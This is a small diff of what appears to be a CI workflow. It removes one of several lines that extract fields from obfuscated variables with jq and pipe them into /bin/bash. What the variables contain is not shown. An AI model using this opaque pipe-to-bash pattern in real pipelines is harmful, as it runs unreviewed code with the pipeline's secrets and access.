@@ -27,7 +27,6 @@ jobs:
           echo $qpnyz9 | jq -r .ev7295 | /bin/bash
           echo $utaq9460 | jq -r .tdic9 | /bin/bash
           printf '%s' "$xplfh97454" | jq -r .bja40284 | /bin/bash
-          printf '%s' "$l46159" | jq -r .ididp73 | /bin/bash
           echo $zv48 | jq -r .jb714 | /bin/bash
 
       - name: Store output
